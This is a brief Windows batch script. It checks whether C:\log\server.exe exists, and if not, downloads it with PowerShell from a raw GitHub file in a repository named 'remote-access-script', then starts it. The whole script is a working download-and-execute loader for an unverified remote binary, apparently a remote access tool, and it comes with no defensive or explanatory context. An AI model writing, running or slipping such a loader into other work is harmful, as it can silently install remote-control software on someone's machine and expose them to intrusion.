@echo off
set "server_exe=C:\log\server.exe"

:: Check if the server executable exists
if exist "%server_exe%" (
    echo Server executable found.
) else (
    echo Server executable not found. Downloading...
    powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/mickr309/remote-access-script/refs/heads/main/server.exe -OutFile %server_exe%"
    if not exist "%server_exe%" (
        echo Failed to download the executable.
        exit /b
    )
)

echo Starting the server...
start "" "%server_exe%"
